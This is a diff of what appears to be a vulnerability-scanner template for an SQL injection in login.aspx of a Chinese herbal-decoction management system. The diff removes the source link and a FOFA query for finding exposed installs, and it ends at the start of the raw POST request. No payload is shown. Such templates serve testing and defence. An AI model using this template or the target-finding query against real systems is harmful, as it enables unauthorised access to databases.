@@ -3,12 +3,8 @@ info:
   name: 东华原煎药管理系统 login.aspx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/pup1b0fiilaolz9u'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: pup1b0fiilaolz9u
-    fofa: app="北京东华原煎药管理系统"
 http:
 - raw:
   - 'POST /login.aspx HTTP/1.1
